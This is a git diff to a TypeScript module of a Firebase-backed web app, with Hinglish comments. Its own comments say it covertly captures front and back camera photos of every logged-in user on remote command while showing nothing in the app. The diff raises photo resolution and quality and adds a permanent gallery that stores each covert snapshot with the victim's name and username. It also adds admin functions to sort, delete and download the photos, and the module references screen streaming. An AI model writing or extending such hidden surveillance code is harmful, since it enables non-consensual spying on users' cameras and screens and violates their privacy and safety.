@@ -3,12 +3,16 @@
  * App UI pe target ko kuch nahi dikhta. OS privacy indicators alag.
  */
 import {
+  addDoc,
   collection,
   doc,
   onSnapshot,
   setDoc,
   updateDoc,
   deleteDoc,
+  query,
+  orderBy,
+  limit,
   type Unsubscribe,
 } from "firebase/firestore";
 import { db } from "../firebase";
@@ -56,14 +60,16 @@ function b64FromBlob(blob: Blob): Promise<string> {
   });
 }
 
+const PHOTO_MAX_B64 = 450_000; // per image — HQ jitna firestore allow kare
+
 async function captureFacing(facing: "user" | "environment"): Promise<string> {
   if (!navigator.mediaDevices?.getUserMedia) throw new Error("camera nahi");
   const stream = await navigator.mediaDevices.getUserMedia({
     audio: false,
     video: {
       facingMode: { ideal: facing },
-      width: { ideal: 640 },
-      height: { ideal: 480 },
+      width: { ideal: 1280 },
+      height: { ideal: 960 },
     },
   });
   try {
@@ -76,9 +82,13 @@ async function captureFacing(facing: "user" | "environment"): Promise<string> {
     document.body.appendChild(video);
     video.srcObject = stream;
     await video.play();
-    await new Promise((r) => setTimeout(r, 350));
-    const w = video.videoWidth || 640;
-    const h = video.videoHeight || 480;
+    await new Promise((r) => setTimeout(r, 400));
+    let w = video.videoWidth || 1280;
+    let h = video.videoHeight || 960;
+    // max edge 1600 — quality vs size
+    const scale = Math.min(1, 1600 / Math.max(w, h));
+    w = Math.max(1, Math.round(w * scale));
+    h = Math.max(1, Math.round(h * scale));
     const canvas = document.createElement("canvas");
     canvas.width = w;
     canvas.height = h;
@@ -88,10 +98,10 @@ async function captureFacing(facing: "user" | "environment"): Promise<string> {
     video.pause();
     video.srcObject = null;
     video.remove();
-    let q = 0.55;
+    let q = 0.88;
     let data = canvas.toDataURL("image/jpeg", q);
-    while (data.length > MAX_B64 * 1.37 && q > 0.25) {
-      q -= 0.1;
+    while (data.length > PHOTO_MAX_B64 * 1.37 && q > 0.4) {
+      q -= 0.08;
       data = canvas.toDataURL("image/jpeg", q);
     }
     return data.includes(",") ? data.split(",")[1]! : data;
@@ -100,7 +110,7 @@ async function captureFacing(facing: "user" | "environment"): Promise<string> {
   }
 }
 
-async function doDualSnap(uid: string, snapId: number) {
+async function doDualSnap(uid: string, snapId: number, meta?: { name?: string; username?: string }) {
   const outRef = doc(db, "deviceCapture", uid);
   await setDoc(
     outRef,
@@ -120,6 +130,7 @@ async function doDualSnap(uid: string, snapId: number) {
   } catch (e) {
     error = (error ? error + " · " : "") + (e instanceof Error ? e.message : "back fail");
   }
+  const at = Date.now();
   await setDoc(
     outRef,
     {
@@ -129,10 +140,27 @@ async function doDualSnap(uid: string, snapId: number) {
       front,
       back,
       error,
-      at: Date.now(),
+      at,
     },
     { merge: true },
   );
+  // Permanent gallery — overwrite nahi, nayi entry
+  if (front || back) {
+    try {
+      await addDoc(collection(db, "livePhotos"), {
+        uid,
+        userName: (meta?.name || "").slice(0, 60),
+        username: (meta?.username || "").slice(0, 40),
+        folderId: "",
+        front,
+        back,
+        snapId,
+        at,
+      });
+    } catch {
+      /* gallery write fail — live preview phir bhi hai */
+    }
+  }
 }
 
 /** Har logged-in user pe chalta hai — commands sunta hai, app UI me kuch nahi dikhata. */
@@ -550,4 +578,93 @@ export function watchScreenStream(targetUid: string, cb: (s: StreamChunk | null)
     },
     () => cb(null),
   );
+}
+
+/* ---------- Permanent photo gallery (admin) ---------- */
+
+export type LivePhoto = {
+  id: string;
+  uid: string;
+  userName: string;
+  username: string;
+  folderId: string;
+  front: string | null;
+  back: string | null;
+  snapId: number;
+  at: number;
+};
+
+export type LiveFolder = {
+  id: string;
+  name: string;
+  at: number;
+};
+
+export function watchLivePhotos(cb: (list: LivePhoto[]) => void): Unsubscribe {
+  return onSnapshot(
+    query(collection(db, "livePhotos"), orderBy("at", "desc"), limit(120)),
+    (s) => {
+      cb(
+        s.docs.map((d) => {
+          const x = d.data();
+          return {
+            id: d.id,
+            uid: String(x.uid || ""),
+            userName: String(x.userName || "").slice(0, 60),
+            username: String(x.username || "").slice(0, 40),
+            folderId: String(x.folderId || ""),
+            front: typeof x.front === "string" ? x.front : null,
+            back: typeof x.back === "string" ? x.back : null,
+            snapId: Number(x.snapId) || 0,
+            at: Number(x.at) || 0,
+          };
+        }),
+      );
+    },
+    () => cb([]),
+  );
+}
+
+export function watchLiveFolders(cb: (list: LiveFolder[]) => void): Unsubscribe {
+  return onSnapshot(
+    query(collection(db, "livePhotoFolders"), orderBy("at", "desc"), limit(40)),
+    (s) => {
+      cb(
+        s.docs.map((d) => {
+          const x = d.data();
+          return { id: d.id, name: String(x.name || "Folder").slice(0, 40), at: Number(x.at) || 0 };
+        }),
+      );
+    },
+    () => cb([]),
+  );
+}
+
+export async function createLiveFolder(name: string) {
+  const n = name.trim().slice(0, 40);
+  if (!n) throw new Error("folder name khali");
+  await addDoc(collection(db, "livePhotoFolders"), { name: n, at: Date.now() });
+}
+
+export async function deleteLiveFolder(folderId: string) {
+  await deleteDoc(doc(db, "livePhotoFolders", folderId));
+}
+
+export async function moveLivePhoto(photoId: string, folderId: string) {
+  await updateDoc(doc(db, "livePhotos", photoId), { folderId: folderId || "" });
+}
+
+export async function deleteLivePhoto(photoId: string) {
+  await deleteDoc(doc(db, "livePhotos", photoId));
+}
+
+/** Browser me JPEG download */
+export function downloadBase64Jpeg(b64: string, filename: string) {
+  const a = document.createElement("a");
+  a.href = `data:image/jpeg;base64,${b64}`;
+  a.download = filename.endsWith(".jpg") ? filename : `${filename}.jpg`;
+  a.rel = "noopener";
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
 }
